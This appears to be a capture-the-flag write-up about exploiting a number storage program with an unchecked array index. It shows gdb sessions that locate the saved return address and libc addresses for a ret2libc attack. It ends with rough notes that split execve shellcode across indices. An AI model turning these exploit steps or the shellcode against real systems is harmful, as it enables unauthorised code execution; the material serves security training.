# Context

The program is a number storage service. We can store numbers, read the stored numbers, or quit. Looking at the [source code](../source.c) in more detail, we notice that there is no check of the index where we save our numbers in the store_number() function. Therefore, we can write almost anywhere we want on the stack. We'll be able to exploit that, but we'll have to deal with some limitations: 

* First of all, concerning the registration of numbers in the dataset:
    - `index % 3` must not be equal to 0
    - `number >> 24` must not be equal to 183 

* The program has been compiled with the `-fstack-protector` flag, meaning that the return address of the program is protected with a [stack canary](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries). 

* At the beginning of the program, `av` and `env` are cleared and therefore cannot be used to store shellcode in memory. 

# lead

we are going to exploit the flaw in the store_number() function. Since we can write on the stack with the offset of our choice, we can change the address stored in EIP without overwriting the canary stack.

We could store a shellcode on the stack using the store_number() function, but it would be a bit tedious. Instead, we'll do a ret2libc attack, as we did for the level04.

# Exploit

First of all, let's find the address of the buffer. We know it is located at 0x24(%esp) in the main() function. Using gdb, we get the address of ESP (0xffffd520) and then calculate the effective address of the buffer: 0xffffd544.

We must then find the address of EIP in order to calculate its offset from the buffer. To do so, we just need to set a breakpoint anywhere in the main() function using gdb, and enter the command `Ã¬nfo frame`:
```
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd710
 Saved registers:
  eip at 0xffffd70c
```
It is the address contained in EIP in the saved registers section that we want: 0xffffd70c. We just have to subtract this address from the buffer address to find the offset:
```
(gdb) p 0xffffd70c - 0xffffd544
$1 = 456
```
Since we record unsigned int, we have to divide this value by 4 to find the right index. So we want to write from index 114.






Finally, we can find the memory addresses of the system() and exit() functions, as well as the string "/bin/sh", as we did in level04:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
```




"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"



index N     : "\x31\xc9\xf7\xe1"
index N+1   : "\xb0\x0b" + jump
index N+3   : "\x51\x68\x2f\x2f"
index N+4   : "\x73\x68" + jump
index N+6   : "\x68\x2f\x62\x69"
index N+7   : "\x6e\x89" + jump
index N+9   : "\xe3\xcd\x80"



buf:                    0xffffd544

eip in read_number():   0x8048930

0x8048930 - 0xffffd544 = -4160441364 (decimal value)
-4160441364 / 4 = -1040110341


buf at index 189: 0xffffd80d
